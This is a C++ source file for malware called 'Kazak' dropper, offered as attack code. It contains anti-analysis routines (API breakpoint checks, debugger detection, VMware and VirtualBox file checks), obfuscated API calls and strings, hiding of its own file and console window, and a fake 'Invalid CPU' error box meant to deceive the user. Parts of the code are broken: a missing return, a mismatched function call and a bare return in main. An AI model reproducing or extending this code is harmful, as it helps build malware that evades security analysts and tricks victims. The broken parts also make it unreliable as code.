#include "../headers/Kazak.h"

#pragma comment(linker, "/arch:x86")

BOOL KazakDropper::IsBp(const char* lpszModule, const char* lpszFunction)
{
	HINSTANCE hLibrary;
	DWORD lpProc;

	hLibrary = li(GetModuleHandleA)(lpszModule);

	if (hLibrary == NULL)
	{
		hLibrary = li(LoadLibraryA)(lpszModule);
	}

	if (hLibrary != NULL)
	{
		lpProc = (DWORD)li(GetProcAddress)(hLibrary, lpszFunction);

		if (lpProc != 0)
		{
			if (*(BYTE*)lpProc == 0xCC) return TRUE;
		}

	}

	return FALSE;
}

bool EvadeAnalysis()
{
	int iNumberOfThreads = std::thread::hardware_concurrency();

	if (KazakDropper::IsBp(enc("Kernel32.dll"), enc("GetModuleHandleA")) || KazakDropper::IsBp(enc("Kernel32.dll"), enc("LoadLibraryA")) || KazakDropper::IsBp(enc("Kernel32.dll"), enc("GetProcAddress")))
		return TRUE;

	else if (IsDebuggerPresent())
		return TRUE;

	else if (std::filesystem::exists(enc("C:\\Windows\\System32\\drivers\\vmxnet.sys")))
		return TRUE;

	else if (std::filesystem::exists(enc("C:\\Windows\\System32\\vboxdisp.dll")))
		return TRUE;

	else if (iNumberOfThreads == 4)
		return TRUE;

}

void Stealth()
{
	li(SetFileAttributesA)(enc("Kazak.exe"), FILE_ATTRIBUTE_HIDDEN);
	li(ShowWindow)(GetConsoleWindow(), SW_HIDE);

	MessageBoxA(
		NULL,
		enc("This software is not able to execute on your current CPU architecture."),
		enc("Fatal Error - Invalid CPU"),
		MB_ICONERROR | MB_OKCANCEL); // fake error

	std::this_thread::sleep_for(std::chrono::seconds(5));
}

int main()
{
	while (!EvadeAnalysis())
	{
		KazakDropper::Stealth();


	}

	if (EvadeAnalysis())
		return;

	return 0;

}